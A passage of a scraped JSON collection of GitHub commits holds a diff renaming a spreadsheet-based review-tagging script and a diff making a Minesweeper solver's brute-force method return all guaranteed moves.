results"}},"https:\/\/github.com\/Jullesverne\/Review-Tagging-Process":{"06a71ffef603966fc535028aeff104f1461bd9f8":{"url":"https:\/\/api.github.com\/repos\/Jullesverne\/Review-Tagging-Process\/commits\/06a71ffef603966fc535028aeff104f1461bd9f8","html_url":"https:\/\/github.com\/Jullesverne\/Review-Tagging-Process\/commit\/06a71ffef603966fc535028aeff104f1461bd9f8","message":"Update and rename Own idea.py to Brute Force.py\n\nSigned-off-by: Jullesverne <78670669+Jullesverne@users.noreply.github.com>","sha":"06a71ffef603966fc535028aeff104f1461bd9f8","keyword":"brute force update","diff":"diff --git a\/Own idea.py b\/Brute Force.py\nsimilarity index 92%\nrename from Own idea.py\nrename to Brute Force.py\nindex c6d8fe4..4e6eafc 100644\n--- a\/Own idea.py\t\n+++ b\/Brute Force.py\t\n@@ -11,7 +11,7 @@\n from openpyxl import load_workbook as lw \n import copy\n import aspose.words as aw\n-nltk.download('stopwords') # CONSIDER CHANGING WHAT THESE ARE, MAYBE MAKE MY OWN\n+nltk.download('stopwords')\n \n \n #NOTE all the tag_num_dic stuff is currently commented out, will need to comment it back in when done\n@@ -58,7 +58,7 @@ def make_score_all(master, tag_dic):\n            tag_dic[tag][word]= tag_dic[tag][word]\/master[word]\n     return tag_dic\n \n-# similar to above, but supposde to make the value the number of times that word was seen for that tag divided by \n+# similar to above, but supposed to make the value the number of times that word was seen for that tag divided by \n # the number of reviews with that tag\n def make_score_num_tag(tags, num_tags):\n     for tag in tags.keys():\n@@ -97,7 +97,6 @@ def accuracy(tag, correct):\n     else:\n         return -1\n \n-# FOR SOME REASON THIS IS GETTING FUCKED UP, DIVIDED BY 10??\n def other_avg(tag, word, tag_dic, num_tags):\n \n         word_count = 0 \n@@ -122,11 +121,11 @@ def make_score_nums_minus_avg(tags, num_tags):\n             tags[tag][word] = tags[tag][word]\/num_tags[tag] - othes\n     return tags\n \n-#loading in data to build the model \n+#loading in data to build the model THIS is specific to you\n workbook = lw(filename='c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/better.xlsx') \n sheet = workbook.active\n \n-# need to update these with correct columns, this is taking in the already tagged examples and building the model \n+# need to update these with your column headers, this is taking in the already tagged examples and building the model \n review_column = 'G' \n tag_column = 'J' \n x=1 \n@@ -137,7 +136,6 @@ def make_score_nums_minus_avg(tags, num_tags):\n \n # this creates the master dic with total word count, and the \n # tag dic with cound of word specific to that review\n-# BOth of which need to be verified, and also need to add in the num_tags_dic to actually work\n while cell.value!= None:\n     review_location = str(review_column)+ str(x)\n     pre_tagged_value = str(tag_column)+str(x)\n@@ -156,7 +154,6 @@ def make_score_nums_minus_avg(tags, num_tags):\n builder=aw.DocumentBuilder(doc)\n \n #this is copying the tags_dic so I can have different scoring dictionaries \n-# NEED TO VERIFY EACH OF THE SCORING DICTIONARIES AND FUNCITONS AS WELL\n \n tags_score_num = copy.deepcopy(tags_dic)\n tags_score_num = make_score_num_tag(tags_score_num, num_tags_dic)\n@@ -217,7 +214,6 @@ def make_score_nums_minus_avg(tags, num_tags):\n         if len(cleaned.split())>0:\n             for tag in tags_score_all.keys():\n                     \n-                    # verify that this section works correctly \n \n                     rating_specific = review_score_creator(cleaned,tags_score_specific[tag])\n                     review_scores_specific[tag] = rating_specific\n@@ -227,12 +223,12 @@ def make_score_nums_minus_avg(tags, num_tags):\n                     review_scores_all[tag]=rating_all\n                     \n \n-                    # I think next two lines could have an error\n                     review_num_tags= review_score_creator(cleaned, tags_score_num[tag])\n                     review_scores_num[tag] = review_num_tags\n \n                     rating_minus_others = review_score_creator(cleaned, tags_num_minus_others[tag])\n                     review_scores_minus[tag] = rating_minus_others\n+                    \n             # these three lines are finding the tag with the highest score for the review\n             maxkey_specific = max(review_scores_specific, key=review_scores_specific.get)\n             maxkey_specific = maxkey_specific.strip()\n@@ -248,7 +244,7 @@ def make_score_nums_minus_avg(tags, num_tags):\n     # this is putting the tag into the location specified earlier\n     \n     \n-    # This whole segment is to test accuracy, will be rehauled before considered seriously \n+    # This whole segment is to test accuracy\n     if isinstance(correct_tag_value, str):\n         larry = copy.deepcopy(correct_tag_value)\n         joe = copy.deepcopy(correct_tag_value)\n","files":{"\/Own idea.py":{"changes":[{"diff":"\n from openpyxl import load_workbook as lw \n import copy\n import aspose.words as aw\n-nltk.download('stopwords') # CONSIDER CHANGING WHAT THESE ARE, MAYBE MAKE MY OWN\n+nltk.download('stopwords')\n \n \n #NOTE all the tag_num_dic stuff is currently commented out, will need to comment it back in when done\n","add":1,"remove":1,"filename":"\/Own idea.py","badparts":["nltk.download('stopwords') # CONSIDER CHANGING WHAT THESE ARE, MAYBE MAKE MY OWN"],"goodparts":["nltk.download('stopwords')"]}],"source":"\n from unittest.mock import NonCallableMagicMock import pandas as pd import numpy as np import re import nltk from nltk.corpus import stopwords from nltk.stem.porter import PorterStemmer from openpyxl import load_workbook as lw import copy import aspose.words as aw nltk.download('stopwords') def review_cleaner(rev): review=re.sub('[^a-zA-Z]', ' ',rev) review=review.lower() review=review.split() ps=PorterStemmer() review=[ps.stem(word) for word in review if not word in set(stopwords.words('english'))] review=' '.join(review) return review def add_to_main(word, master): if word in master: master[word]+=1 else: master.update({word:1}) return master def add_to_tag_dic(word, tag, nest): if tag in nest: if word in nest[tag]: nest[tag][word]+=1 else: nest[tag].update({word:1}) else: nest.update({tag:{}}) nest[tag].update({word:1}) return nest def make_score_all(master, tag_dic): for tag in tag_dic.keys(): for word in tag_dic[tag].keys(): tag_dic[tag][word]=tag_dic[tag][word]\/master[word] return tag_dic def make_score_num_tag(tags, num_tags): for tag in tags.keys(): for word in tags[tag].keys(): tags[tag][word]=tags[tag][word]\/num_tags[tag] return tags def make_score_tag_specific(tag_dic): for tag in tag_dic.keys(): values=tag_dic[tag].values() total=sum(values) for word in tag_dic[tag].keys(): tag_dic[tag][word]=tag_dic[tag][word]\/total return tag_dic def review_score_creator(review, score_dic): score=0 rev_iter=review.split() for word in rev_iter: if word in score_dic.keys(): score+=score_dic[word] score=float(score) score=score \/ len(rev_iter) \/ 1.000000000000 return score def accuracy(tag, correct): if tag.lower()==correct.lower(): return 1 else: return -1 def other_avg(tag, word, tag_dic, num_tags): word_count=0 tag_count=0 for tags in tag_dic.keys(): if tags!=tag: tag_count+=num_tags[tags] if word in tag_dic[tags].keys(): word_count+=tag_dic[tags][word] return word_count \/ tag_count def make_score_nums_minus_avg(tags, num_tags): c1=copy.deepcopy(tags) c2=copy.deepcopy(num_tags) for tag in tags.keys(): for word in tags[tag].keys(): othes=other_avg(tag, word, c1, c2) tags[tag][word]=tags[tag][word]\/num_tags[tag] -othes return tags workbook=lw(filename='c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/better.xlsx') sheet=workbook.active review_column='G' tag_column='J' x=1 cell=sheet[str(review_column)+str(x)] master_dic={} tags_dic={} num_tags_dic={} while cell.value!=None: review_location=str(review_column)+str(x) pre_tagged_value=str(tag_column)+str(x) cell=sheet[review_location] tag=sheet[pre_tagged_value] if isinstance(cell.value, str) and isinstance(tag.value, str): clean_rev=review_cleaner(cell.value) tag.value=tag.value.strip() add_to_main(tag.value.lower(), num_tags_dic) for word in clean_rev.split(): add_to_main(word, master_dic) add_to_tag_dic(word, tag.value.lower(), tags_dic) x+=1 doc=aw.Document() builder=aw.DocumentBuilder(doc) tags_score_num=copy.deepcopy(tags_dic) tags_score_num=make_score_num_tag(tags_score_num, num_tags_dic) tags_score_specific=copy.deepcopy(tags_dic) tags_score_specific=make_score_tag_specific(tags_score_specific) tags_score_all=copy.deepcopy(tags_dic) tags_score_all=make_score_all(master_dic, tags_score_all) tags_num_minus_others=copy.deepcopy(tags_dic) tags_num_minus_others=make_score_nums_minus_avg(tags_num_minus_others, num_tags_dic) fresh=lw(filename='c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/to_tag.xlsx') reviews=fresh.active x=1 rev_col='A' review=reviews[str(rev_col)+str(x)] tag_col='C' tag_true='B' correct_tag=str(tag_true)+str(x) RA=0 RS=0 RN=0 RF=0 when_right={} when_wrong={} while review.value!=None: review_location=str(rev_col)+str(x) review=reviews[review_location] tag_location=str(tag_col)+str(x) correct_tag=str(tag_true)+str(x) copier=str('D')+str(x) if review.value==None: break if isinstance(reviews[correct_tag].value, str): correct_tag_value=reviews[correct_tag].value.lower() correct_tag_value=correct_tag_value.strip() review_scores_all={} review_scores_specific={} review_scores_num={} review_scores_minus={} if isinstance(review.value, str): john=copy.deepcopy(review.value) cleaned=review_cleaner(review.value) if len(cleaned.split())>0: for tag in tags_score_all.keys(): rating_specific=review_score_creator(cleaned,tags_score_specific[tag]) review_scores_specific[tag]=rating_specific rating_all=review_score_creator(cleaned,tags_score_all[tag]) review_scores_all[tag]=rating_all review_num_tags=review_score_creator(cleaned, tags_score_num[tag]) review_scores_num[tag]=review_num_tags rating_minus_others=review_score_creator(cleaned, tags_num_minus_others[tag]) review_scores_minus[tag]=rating_minus_others maxkey_specific=max(review_scores_specific, key=review_scores_specific.get) maxkey_specific=maxkey_specific.strip() maxkey_all=max(review_scores_all, key=review_scores_all.get) maxkey_all=maxkey_all.strip() maxkey_num=max(review_scores_num, key=review_scores_num.get) maxkey_mins=max(review_scores_minus, key=review_scores_minus.get) if john !=None: reviews[tag_location]=maxkey_num reviews[copier]=john maxkey_num=maxkey_num.strip() if isinstance(correct_tag_value, str): larry=copy.deepcopy(correct_tag_value) joe=copy.deepcopy(correct_tag_value) bob=copy.deepcopy(correct_tag_value) RS +=accuracy(maxkey_specific, larry) RA +=accuracy(maxkey_all, correct_tag_value) RN +=accuracy(maxkey_num, joe) RF +=accuracy(maxkey_mins, bob) else: print('old tag was weird') print(correct_tag_value) x+=1 builder.write('number correct for all scoring dic') builder.write(' ') builder.write(str(RA)) builder.write(' number correct for specific scoring dic') builder.write(' ') builder.write(str(RS)) builder.write(' number correct for num scoring dic') builder.write(' ') builder.write(str(RN)) builder.write(' number correct for fancy way') builder.write(str(RF)) total=x-1 builder.write( 'total reviews were ') builder.write(str(total)) print('number write using new score') print(RN\/total) print('total') print(total) fresh.save(filename='c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/to_tag.xlsx') doc.save(\"c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/reader.docx\") ","sourceWithComments":"# https:\/\/openpyxl.readthedocs.io\/en\/stable\/tutorial.html library being used\n\n# importing stuff, not all used tbh\nfrom unittest.mock import NonCallableMagicMock\nimport pandas as pd \nimport numpy as np\nimport re \nimport nltk \nfrom nltk.corpus import stopwords\nfrom nltk.stem.porter import PorterStemmer\nfrom openpyxl import load_workbook as lw \nimport copy\nimport aspose.words as aw\nnltk.download('stopwords') # CONSIDER CHANGING WHAT THESE ARE, MAYBE MAKE MY OWN\n\n\n#NOTE all the tag_num_dic stuff is currently commented out, will need to comment it back in when done\n\n\n#takes a review as as string, cleans it and returns it as a list \ndef review_cleaner(rev):\n    review = re.sub('[^a-zA-Z]', ' ',rev)\n    review=review.lower()\n    review=review.split()\n    ps=PorterStemmer()\n    review = [ps.stem(word) for word in review if not word in set(stopwords.words('english'))] \n    review =' '.join(review)\n    return review\n\n#takes a word and a dictionary, puts word as key, and value is numebr of times that word has been seen \ndef add_to_main(word, master):\n    if word in master:\n        master[word]+=1\n    else:\n        master.update({word:1})\n    return master\n\n# takes a word, tag and dictionary of dictionaries\n# tag is key for high level dicitonary, word is key for lower level\n# keeps track of word count for each specific tag\ndef add_to_tag_dic(word, tag, nest):\n    if tag in nest:\n        if word in nest[tag]:\n            nest[tag][word]+=1\n        else:\n            nest[tag].update({word:1})\n    else:\n        nest.update({tag:{}})\n        nest[tag].update({word:1})\n    return nest\n\n# takes two dictionaries, one with count of every word, other dicitonary of dictionary, and updates values\n# in the dictioary that holds the word count for each tag to be the word count for each tag \/ total number of times that word\n# was seen\ndef make_score_all(master, tag_dic):\n    for tag in tag_dic.keys():\n        for word in tag_dic[tag].keys():\n           tag_dic[tag][word]= tag_dic[tag][word]\/master[word]\n    return tag_dic\n\n# similar to above, but supposde to make the value the number of times that word was seen for that tag divided by \n# the number of reviews with that tag\ndef make_score_num_tag(tags, num_tags):\n    for tag in tags.keys():\n        for word in tags[tag].keys():\n            tags[tag][word] = tags[tag][word]\/num_tags[tag]\n    return tags\n\n\n# same as make_score_all, but instead of dividing by the total word count for a specific word\n# divides by the total number of words used for that type of tag\ndef make_score_tag_specific(tag_dic): \n    for tag in tag_dic.keys():\n        values=tag_dic[tag].values()\n        total = sum(values)\n        for word in tag_dic[tag].keys():\n           tag_dic[tag][word]= tag_dic[tag][word]\/total\n    return tag_dic\n\n\n# takes a review as a string and a dictionary specific to a tag (i.e key is word in that tag, value is that words score)\n# and returns the reviews score for that type of tag\ndef review_score_creator(review, score_dic):\n    score = 0 \n    rev_iter = review.split()\n    for word in rev_iter:\n        if word in score_dic.keys():\n            score+=score_dic[word]\n            #score+=1\n    score= float(score)\n    score = score \/ len(rev_iter) \/ 1.000000000000\n    return score\n\ndef accuracy(tag, correct):\n    if tag.lower() == correct.lower():\n        return 1\n    else:\n        return -1\n\n# FOR SOME REASON THIS IS GETTING FUCKED UP, DIVIDED BY 10??\ndef other_avg(tag, word, tag_dic, num_tags):\n\n        word_count = 0 \n        tag_count = 0 \n        for tags in tag_dic.keys():\n            if tags!= tag:\n                tag_count+=num_tags[tags]\n             \n                if word in tag_dic[tags].keys():\n                    word_count+=tag_dic[tags][word]\n                    \n        return word_count \/ tag_count\n\n\ndef make_score_nums_minus_avg(tags, num_tags):\n    c1 = copy.deepcopy(tags)\n    c2 = copy.deepcopy(num_tags)\n    for tag in tags.keys():\n        for word in tags[tag].keys():\n            othes = other_avg(tag, word, c1, c2)\n           \n            tags[tag][word] = tags[tag][word]\/num_tags[tag] - othes\n    return tags\n\n#loading in data to build the model \nworkbook = lw(filename='c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/better.xlsx') \nsheet = workbook.active\n\n# need to update these with correct columns, this is taking in the already tagged examples and building the model \nreview_column = 'G' \ntag_column = 'J' \nx=1 \ncell = sheet[str(review_column)+str(x)]\nmaster_dic = {}\ntags_dic = {}\nnum_tags_dic = {} \n\n# this creates the master dic with total word count, and the \n# tag dic with cound of word specific to that review\n# BOth of which need to be verified, and also need to add in the num_tags_dic to actually work\nwhile cell.value!= None:\n    review_location = str(review_column)+ str(x)\n    pre_tagged_value = str(tag_column)+str(x)\n    cell = sheet[review_location]\n    tag=sheet[pre_tagged_value]\n    if isinstance(cell.value, str) and isinstance(tag.value, str):\n        clean_rev = review_cleaner(cell.value)\n        tag.value = tag.value.strip()\n        add_to_main(tag.value.lower(), num_tags_dic)\n        for word in clean_rev.split():\n            add_to_main(word, master_dic)\n            add_to_tag_dic(word, tag.value.lower(), tags_dic)\n    x+=1\n\ndoc = aw.Document()\nbuilder=aw.DocumentBuilder(doc)\n\n#this is copying the tags_dic so I can have different scoring dictionaries \n# NEED TO VERIFY EACH OF THE SCORING DICTIONARIES AND FUNCITONS AS WELL\n\ntags_score_num = copy.deepcopy(tags_dic)\ntags_score_num = make_score_num_tag(tags_score_num, num_tags_dic)\n\n\ntags_score_specific = copy.deepcopy(tags_dic)\ntags_score_specific = make_score_tag_specific(tags_score_specific)\n\n\n\ntags_score_all = copy.deepcopy(tags_dic)\ntags_score_all = make_score_all(master_dic, tags_score_all) \n\n\ntags_num_minus_others = copy.deepcopy(tags_dic)\ntags_num_minus_others = make_score_nums_minus_avg(tags_num_minus_others, num_tags_dic)\n\n\n# now loading in new reviews that I am going to generate tags for \nfresh = lw(filename='c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/to_tag.xlsx') \nreviews = fresh.active\n\nx=1\nrev_col = 'A' #col reviews are in\nreview = reviews[str(rev_col)+str(x)]\ntag_col = 'C' # where you want tag placed\ntag_true = 'B' # because I am using a test set this is where the true tags are actually contained\ncorrect_tag = str(tag_true)+str(x)\n\nRA = 0\nRS = 0 \nRN = 0 \nRF = 0 \n\nwhen_right = {}\nwhen_wrong = {}\nwhile review.value!= None:\n    review_location = str(rev_col)+ str(x)\n    review = reviews[review_location]\n    tag_location = str(tag_col)+str(x) # where its gonna be put\n    correct_tag = str(tag_true)+str(x) # one I am checking against\n    copier = str('D')+str(x)\n\n    if review.value == None:\n        break\n    # this if statement is just for comparisons sake \n    if isinstance(reviews[correct_tag].value, str):\n        correct_tag_value = reviews[correct_tag].value.lower()\n        correct_tag_value = correct_tag_value.strip()\n    review_scores_all = {}\n    review_scores_specific = {}\n    review_scores_num = {}\n    review_scores_minus = {}\n    #now we are generating the score for each potential tag of a review \n    if isinstance(review.value, str):\n        john = copy.deepcopy(review.value)\n        cleaned = review_cleaner(review.value)\n        if len(cleaned.split())>0:\n            for tag in tags_score_all.keys():\n                    \n                    # verify that this section works correctly \n\n                    rating_specific = review_score_creator(cleaned,tags_score_specific[tag])\n                    review_scores_specific[tag] = rating_specific\n                    \n\n                    rating_all = review_score_creator(cleaned,tags_score_all[tag])\n                    review_scores_all[tag]=rating_all\n                    \n\n                    # I think next two lines could have an error\n                    review_num_tags= review_score_creator(cleaned, tags_score_num[tag])\n                    review_scores_num[tag] = review_num_tags\n\n                    rating_minus_others = review_score_creator(cleaned, tags_num_minus_others[tag])\n                    review_scores_minus[tag] = rating_minus_others\n            # these three lines are finding the tag with the highest score for the review\n            maxkey_specific = max(review_scores_specific, key=review_scores_specific.get)\n            maxkey_specific = maxkey_specific.strip()\n            maxkey_all = max(review_scores_all, key=review_scores_all.get)\n            maxkey_all = maxkey_all.strip()\n            maxkey_num = max(review_scores_num, key=review_scores_num.get)\n            maxkey_mins = max(review_scores_minus, key=review_scores_minus.get)\n            if john != None:\n                reviews[tag_location] = maxkey_num\n                reviews[copier] = john\n            maxkey_num = maxkey_num.strip()\n\n    # this is putting the tag into the location specified earlier\n    \n    \n    # This whole segment is to test accuracy, will be rehauled before considered seriously \n    if isinstance(correct_tag_value, str):\n        larry = copy.deepcopy(correct_tag_value)\n        joe = copy.deepcopy(correct_tag_value)\n        bob = copy.deepcopy(correct_tag_value)\n        RS += accuracy(maxkey_specific, larry)\n        RA += accuracy(maxkey_all, correct_tag_value)\n        RN += accuracy(maxkey_num, joe)\n        RF += accuracy(maxkey_mins, bob)\n    \n    else:\n        print('old tag was weird')\n        print(correct_tag_value)\n    # increase x to iterate to the next tag\n    x+=1\n\nbuilder.write('number correct for all scoring dic')\nbuilder.write('     ')\nbuilder.write(str(RA))\n\nbuilder.write('  number correct for specific scoring dic')\nbuilder.write('     ')\nbuilder.write(str(RS))\n\nbuilder.write('  number correct for num scoring dic')\nbuilder.write('     ')\nbuilder.write(str(RN))\n\nbuilder.write('   number correct for fancy way')\nbuilder.write(str(RF))\n# this is all just accuracy testing\n\ntotal = x-1\nbuilder.write(  'total reviews were    ')\nbuilder.write(str(total))\n\nprint('number write using new score')\nprint(RN\/total)\n\nprint('total')\nprint(total)\n# this is saving the now tagged reviews to a file you specify\nfresh.save(filename='c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/to_tag.xlsx') \ndoc.save(\"c:\/Users\/HP\/Desktop\/Review-Tagging-Process\/reader.docx\")\n"}},"msg":"Update and rename Own idea.py to Brute Force.py\n\nSigned-off-by: Jullesverne <78670669+Jullesverne@users.noreply.github.com>"}},"https:\/\/github.com\/chriseklopp\/MinesweeperSolverCV":{"66faa67f88cc0e853476fdc199aa31180e809851":{"url":"https:\/\/api.github.com\/repos\/chriseklopp\/MinesweeperSolverCV\/commits\/66faa67f88cc0e853476fdc199aa31180e809851","html_url":"https:\/\/github.com\/chriseklopp\/MinesweeperSolverCV\/commit\/66faa67f88cc0e853476fdc199aa31180e809851","message":"Can now give multiple moves to execute in a single update. Brute force method now returns all guaranteed moves.","sha":"66faa67f88cc0e853476fdc199aa31180e809851","keyword":"brute force update","diff":"diff --git a\/MInstance.py b\/MInstance.py\nindex 9adc9d9..9a1f23c 100644\n--- a\/MInstance.py\n+++ b\/MInstance.py\n@@ -65,9 +65,10 @@ def update(self, screen_snapshot):\n \n         self.debugarray = self.grid_array.grid_array[:, :, 0].transpose()  # DEBUG PURPOSES\n \n-        k = self.my_logic_plugin.update(self.grid_array)\n+        results = self.my_logic_plugin.update(self.grid_array)\n+        for k in results:\n+            self.cursor_control(k[0], k[1])\n \n-        self.cursor_control(k[0], k[1])\n         end = cv2.getTickCount()\n         total = (end - start) \/ cv2.getTickFrequency()\n         total\n@@ -97,12 +98,12 @@ def cursor_control(self, location, action='left'):  # tells cursor to perform ac\n \n         if action == 'left':\n             win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0)\n-            time.sleep(.01)\n+            time.sleep(.005)\n             win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0)\n \n         elif action == 'right':\n             win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x_target, y_target, 0, 0)\n-            time.sleep(.01)\n+            time.sleep(.005)\n             win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x_target, y_target, 0, 0)\n \n         elif action == 'double_left':\ndiff --git a\/MLogicPlugin.py b\/MLogicPlugin.py\nindex 001a4eb..c4198dd 100644\n--- a\/MLogicPlugin.py\n+++ b\/MLogicPlugin.py\n@@ -5,7 +5,7 @@\n Though this was originally just a function, it has been made a class to make it easier to act upon previous moves\n Having this isolated from the rest of the code allows for increased readability and allows for implementation of new\n solving logic without breaking and other parts of the code\n-This class can have whatever you want in it as long as it contains an update function that returns (location, action)\n+This class can have whatever you want in it as long as it contains an update function that returns list(location, action)\n \n WANT:\n - goes down the list in order. if one is true it will start over.\n@@ -49,8 +49,8 @@ def update(self, grid_array):\n \n         self.grid_array = grid_array\n         focus = self.previous_focus\n-        location, action = self.logic_flow(focus)\n-        return location, action\n+        actionlist = self.logic_flow(focus)\n+        return actionlist\n \n     def logic_flow(self, focus):  # this function is recursive\n \n@@ -76,7 +76,7 @@ def logic_flow(self, focus):  # this function is recursive\n                     if np.isnan(tile_info[0]):\n                         print(location.values(), \"RULE1 RETURN\", tile_info[0])\n                         self.previous_focus = focus\n-                        return location, 'right'\n+                        return [(location, 'right')]\n \n         # \"RULE 2\"\n         else:\n@@ -84,7 +84,7 @@ def logic_flow(self, focus):  # this function is recursive\n                 if np.isnan(tile_info[0]):\n                     print(focus.values(), \"RULE2 RETURN\")\n                     self.previous_focus = focus\n-                    return focus, 'double_left'\n+                    return [(focus, 'double_left')]  # TODO: IS THIS RIGHT???\n \n                     # print(location.values(), \"RULE2 RETURN\")\n                     # self.previous_focus = focus\n@@ -133,13 +133,20 @@ def logic_flow(self, focus):  # this function is recursive\n \n                         # offset, probability, action = self.backtracking_method(subplot)\n                         # print(result)\n-                        offset, probability, action = self.brute_force_method(sub_array)  # RUN BRUTE FORCE METHOD ON IT\n+                        bf_list = self.brute_force_method(sub_array)  # RUN BRUTE FORCE METHOD ON IT\n+\n+                        if len(bf_list) > 1 or bf_list[0][1] == 1:\n+\n+                            rem_prob = []\n+                            for item in bf_list:\n+                                os, prob, act = item\n+                                rem_prob.append((rel_location + os, act))\n+                            print(f\"Return guaranteed list of length {len(rem_prob)}\")\n+                            return rem_prob\n \n-                        if probability == 1:\n-                            print(f\"LOCATION: {(rel_location + offset).values()} PROBABILITY: {probability}\")\n-                            return rel_location + offset, action\n                         else:\n-                            section_results.append((rel_location + offset, probability, action))  # ADD TO RESULTS\n+                            os, prob, act = bf_list[0]\n+                            section_results.append((rel_location + os, prob, act))  # ADD TO RESULTS\n \n                     else:  # occurs when all possible starting locations have been exhausted.\n                         self.previous_focus = focus\n@@ -152,13 +159,13 @@ def logic_flow(self, focus):  # this function is recursive\n                         print(\"UN-GUARANTEED MOVE\")\n                         print(f\"POSSIBLE MOVES: {len(probability)}\")\n                         print(f\"LOCATION: {sub_plot_location[max_index].values()} PROBABILITY: {max_probability}\")\n-                        return sub_plot_location[max_index], action[max_index]\n+                        return [(sub_plot_location[max_index], action[max_index])]\n \n                 # cv2.waitKey(0)\n         #  ##### PART 5) #####\n         print('ENTERING PART 5')\n         print(\"RANDOM RETURN\")\n-        return self.grid_array.get_random_unrevealed_location(), \"left\"\n+        return [(self.grid_array.get_random_unrevealed_location(), \"left\")]\n \n     def new_create_subset(self, focus):\n \n@@ -315,7 +322,7 @@ def clean_subarray(sub_array):\n         return sub_array  # return  cleaned sub array\n \n     @staticmethod\n-    def split_subset(subset):\n+    def split_subarray(sub_array):\n         subset_list = []\n         row_num, col_num = np.shape(subset)\n         if row_num % 2 != 0:\n@@ -362,11 +369,10 @@ def split_subset(subset):\n             subset_list.append((MCoordinate(0, 0), left_subplot))\n             subset_list.append((MCoordinate(0, int(col_num \/ 2)), right_subplot))\n \n-\n         return subset_list  # returns offset (for each) from original subset and the split subsets.\n \n     @staticmethod\n-    def brute_force_method(subarray):  # TODO: Update this function.\n+    def brute_force_method(subarray):  # TODO: ALLOW MULTIPLE RETURNS FROM ONE BRUTE FORCE.\n         # Handles a subarray of the grid. Generates all 2^n, n= # unrevealed tiles possible mine layouts.\n         # Validate each layout to determine which ones are possible\n         # Find proportion of valid layouts with a mine for each square.\n@@ -411,29 +417,33 @@ def brute_force_method(subarray):  # TODO: Update this function.\n         column_sums = valid_combination_array.sum(axis=0)\n         column_proportions = column_sums\/len(valid_combination_array)\n \n-        max_value = np.max(column_proportions)\n-        max_value_position = np.argmax(column_proportions)\n+        one_locs = np.argwhere(column_proportions == 1)\n+        zero_locs = np.argwhere(column_proportions == 0)\n+        return_locs = []\n \n-        min_value = np.min(column_proportions)\n-        min_value_position = np.argmin(column_proportions)\n+        for loc in one_locs:\n+            location = MCoordinate(unrevealed_locations[0][loc[0]],\n+                                   unrevealed_locations[1][loc[0]])\n+            return_locs.append((location, 1, 'right'))\n+\n+        for loc in zero_locs:\n+            location = MCoordinate(unrevealed_locations[0][loc[0]],\n+                                   unrevealed_locations[1][loc[0]])\n+            return_locs.append((location, 1, 'left'))\n \n-        if np.isnan(min_value) or np.isnan(max_value):\n-            print(\"POOPOO\")\n+        if return_locs:\n+            return return_locs\n \n-        if min_value == 0:\n-            location = MCoordinate(unrevealed_locations[0][min_value_position],\n-                                   unrevealed_locations[1][min_value_position])\n+        # max_value = np.max(column_proportions)\n+        # max_value_position = np.argmax(column_proportions)\n \n-            print(f\"PROB: {1-min_value}\")\n-            return location, 1-min_value, 'left'\n+        min_value = np.min(column_proportions)\n+        min_value_position = np.argmin(column_proportions)\n \n-        if max_value == 1:\n-            location = MCoordinate(unrevealed_locations[0][max_value_position],\n-                                   unrevealed_locations[1][max_value_position])\n-            print(f\"PROB: {max_value}\")\n-            return location, max_value, 'right'\n+        # if np.isnan(min_value) or np.isnan(max_value):\n+        #     print(\"POOPOO\")\n \n         location = MCoordinate(unrevealed_locations[0][min_value_position],\n                                unrevealed_locations[1][min_value_position])\n         print(f\"PROB: {1-min_value}\")\n-        return location, 1-min_value, 'left'\n+        return [(location, 1-min_value, 'left')]\n","files":{"\/MInstance.py":{"changes":[{"diff":"\n \n         self.debugarray = self.grid_array.grid_array[:, :, 0].transpose()  # DEBUG PURPOSES\n \n-        k = self.my_logic_plugin.update(self.grid_array)\n+        results = self.my_logic_plugin.update(self.grid_array)\n+        for k in results:\n+            self.cursor_control(k[0], k[1])\n \n-        self.cursor_control(k[0], k[1])\n         end = cv2.getTickCount()\n         total = (end - start) \/ cv2.getTickFrequency()\n         total\n","add":3,"remove":2,"filename":"\/MInstance.py","badparts":["        k = self.my_logic_plugin.update(self.grid_array)","        self.cursor_control(k[0], k[1])"],"goodparts":["        results = self.my_logic_plugin.update(self.grid_array)","        for k in results:","            self.cursor_control(k[0], k[1])"]},{"diff":"\n \n         if action == 'left':\n             win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x_target, y_target, 0, 0)\n-            time.sleep(.01)\n+            time.sleep(.005)\n             win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x_target, y_target, 0, 0)\n \n         elif action == 'right':\n             win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x_target, y_target, 0, 0)\n-            time.sleep(.01)\n+            time.sleep(.005)\n             win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x_target, y_target, 0, 0)\n \n         elif action == 'double_left':","add":2,"remove":2,"filename":"\/MInstance.py","badparts":["            time.sleep(.01)","            time.sleep(.01)"],"goodparts":["            time.sleep(.005)","            time.sleep(.005)"]}],"source":"\n\"\"\" MInstance class Independent instance of a minesweeper game contains information about a single game of minesweeper on the screen \"\"\" import cv2 import numpy as np import MLogicPlugin_Debug import math import time import pyautogui from MCoordinate import MCoordinate from MLogicPlugin import MLogicPlugin import time import win32api import win32con from MTileArray import MTileArray class MInstance: feature_definitions={'1':([85, 66, 130],[117, 255, 255],[0, 0]), '2':([44, 162, 87],[66, 255, 158],[0, 0]), '3':([0, 101, 144],[37, 255, 202],[1, 0]), '4':([97, 232, 64],[161, 255, 217],[0, 0]), '5':([0, 62, 107],[37, 255, 144],[0, 0]), '6':([63, 175, 96],[101, 255, 188],[0, 0]), '8':([0, 101, 144],[37, 255, 202],[1, 1]), '7':([0, 101, 144],[37, 255, 202],[0, 0]), '99':([0, 77, 188],[59, 255, 255],[0, 0]) } id=0 def __init__(self, location_tuple): self.my_window_location, self.my_grid_location, self.tile_length=location_tuple self.grid_array=MTileArray((30, 16)) self.debugarray=self.grid_array.grid_array[:,:, 0].transpose() self.flags=0 self.is_complete=False self.my_logic_plugin=MLogicPlugin(self.grid_array) self.id=MInstance.id MInstance.id +=1 def get_id(self): print(self.id) def update(self, screen_snapshot): start=cv2.getTickCount() if self._detect_window_popup(screen_snapshot): self.is_complete=True return self.update_array(screen_snapshot) 